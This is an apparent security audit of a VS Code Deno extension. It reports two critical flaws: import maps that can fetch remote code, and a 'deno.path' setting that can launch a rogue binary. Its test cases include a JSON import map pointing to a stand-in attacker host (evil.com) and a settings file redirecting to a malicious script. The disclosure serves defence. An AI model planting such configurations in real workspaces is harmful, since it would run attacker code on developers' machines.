## Vulnerability: Remote Module Injection via Malicious Import Map

- **Description:**
  - An attacker who can control a workspace’s configuration (for example, by providing a malicious deno.json, deno.jsonc, or import map file) could supply an import map that points to a malicious remote module.
  - When the extension triggers a caching operation (via commands such as “Deno: Cache” or when running tests, formatting, or linting), it passes the unsanitized configuration (including the import map URL) as command‑line arguments to the Deno CLI.
  - The Deno CLI then downloads—and later executes—the remote module pointed to by the import map.
  - This sequence lets an attacker inject and execute arbitrary code into the developer’s environment.

- **Impact:**
  - Arbitrary code execution on the developer’s workstation with their privileges.
  - Possible compromise of the development environment, data exfiltration, or lateral movement within the network.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  - The extension depends on VS Code’s trusted configuration system.
  - It passes configuration values (via `config.get("importMap")` or similar calls) directly to the Deno CLI without performing explicit sanitization.

- **Missing Mitigations:**
  - There is no validation or sanitization of remote URLs specified in the import map configuration.
  - No checks are performed to ensure that only trusted domains are used, nor are there any warnings to the user when a remote module is about to be fetched.
  - The Deno CLI invocation is not isolated or sandboxed.

- **Preconditions:**
  - An attacker must be able to control or inject a malicious Deno configuration file, import map file, or workspace settings (for example, via a compromised repository or through social engineering that leads a developer to open a modified workspace).
  - The developer must then enable the extension (or allow auto‑detection via an existing deno.json/deno.jsonc) so that these settings are read and passed on.

- **Source Code Analysis:**
  - In **client/src/debug_config_provider.ts** and **client/src/tasks.ts**, configuration values such as `"deno.importMap"` or `"deno.config"` are read using `config.get(…)` and then pushed into command‑line argument arrays without further inspection.
  - For example, when starting the Deno language server or executing a task, the extension constructs a runtime arguments array that includes the import map (if set) directly:
    ```ts
    if (settings.importMap) {
      args.push("--import-map");
      args.push(settings.importMap.trim());
    }
    ```
  - Similarly, the caching command (from **commands.ts**, e.g. in `cacheActiveDocument`) invokes the Deno CLI with URIs derived from the active document—if the workspace’s configuration were modified to include a malicious import map, then the Deno runtime would be forced to fetch and run associated remote code.

- **Security Test Case:**
  - **Step 1:** Create a test workspace that includes a malicious configuration file. For instance, craft a `deno.json` (or `deno.jsonc`) that specifies an import map with an entry such as:
    ```json
    {
      "imports": {
        "malicious/": "https://evil.com/malicious.js"
      }
    }
    ```
    Alternatively, have a separate import map file and set the `"deno.importMap"` property in the workspace settings to point to it.
  - **Step 2:** Open the test workspace in VS Code with the Deno extension enabled (or trigger workspace auto‑detection by having the configuration file at the workspace root).
  - **Step 3:** Use the command palette to run the “Deno: Cache” command (or trigger any operation that resolves remote modules).
  - **Step 4:** Monitor the network traffic and/or the Deno CLI’s output to see if it downloads a file from “https://evil.com/malicious.js”.
  - **Step 5:** Verify that the malicious module is fetched and, if possible, execute a harmless payload that demonstrates code execution.
  - A successful test confirms that unsanitized remote URLs from import maps are being passed directly to the Deno CLI.

---

## Vulnerability: Malicious Deno Executable Path Injection

- **Description:**
  - The extension reads the `"deno.path"` setting from the VS Code configuration (via a workspace’s settings.json or user settings) in order to locate the Deno executable.
  - If an attacker gains control over this configuration (for example, by including a tainted `.vscode/settings.json` file in the workspace), they could set `"deno.path"` to point to a malicious executable instead of the legitimate Deno binary.
  - As a result, when the extension starts the language server—or runs any Deno CLI subcommand—it will execute the attacker‑controlled binary.

- **Impact:**
  - Execution of a rogue executable under the developer’s privileges, potentially leading to arbitrary code execution, data compromise, or system takeover.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  - The extension obtains the Deno executable path using the VS Code configuration API and a relative‑path resolution check (in **client/src/util.ts**).
  - However, this resolution only ensures that relative paths are resolved against the active workspace folder; no checks are made to verify that the resolved executable is indeed the authentic Deno CLI.

- **Missing Mitigations:**
  - No validation or verification is performed against a known good version, digital signature, or checksum.
  - There is no mechanism to warn the user if the configured path differs markedly from the expected default installation.
  - There is a lack of sandboxing or isolation to limit the potential effect of running an untrusted binary.

- **Preconditions:**
  - An attacker must be able to supply a modified workspace configuration (for example, via a malicious repository commit or by tricking the developer into using a tainted settings.json).
  - The developer must open the workspace so that the extension reads the modified `"deno.path"` value.

- **Source Code Analysis:**
  - In the function **getDenoCommandPath()** (in **client/src/util.ts**), the extension retrieves the Deno CLI path by calling:
    ```ts
    const command = getWorkspaceConfigDenoExePath();
    ```
  - The helper function `getWorkspaceConfigDenoExePath()` simply returns the value of `config.get("path")` from the `"deno"` namespace.
  - If the returned path is not absolute, the code then resolves it relative to available workspace folders without performing any integrity or authenticity checks.
  - Later, in **commands.ts** (inside the `startLanguageServer` function), this (possibly malicious) path is used as the command for the LanguageClient’s server options, meaning that any process launched will execute that binary.

- **Security Test Case:**
  - **Step 1:** Create a test workspace that includes a `.vscode/settings.json` file. In this file, set the `"deno.path"` property to point to a controlled (but clearly distinguishable) “malicious” binary or script. For example:
    ```json
    {
      "deno.path": "./malicious-deno.sh"
    }
    ```
    where `malicious-deno.sh` is a script that logs its execution (or performs a harmless demonstration of code execution) instead of running the real Deno CLI.
  - **Step 2:** Place the malicious binary/script in the appropriate location relative to the workspace so that the relative‑path resolution in the extension picks it up.
  - **Step 3:** Open the test workspace in VS Code with the Deno extension enabled.
  - **Step 4:** Trigger a command that forces the extension to start (for example, use “Deno: Enable” or trigger a caching operation).
  - **Step 5:** Check the extension’s output channel and system process list (or use logging in the malicious script) to verify that the malicious binary was executed instead of the legitimate Deno CLI.
  - A positive result indicates that the extension is using the unsanitized `"deno.path"` setting without verifying its authenticity.
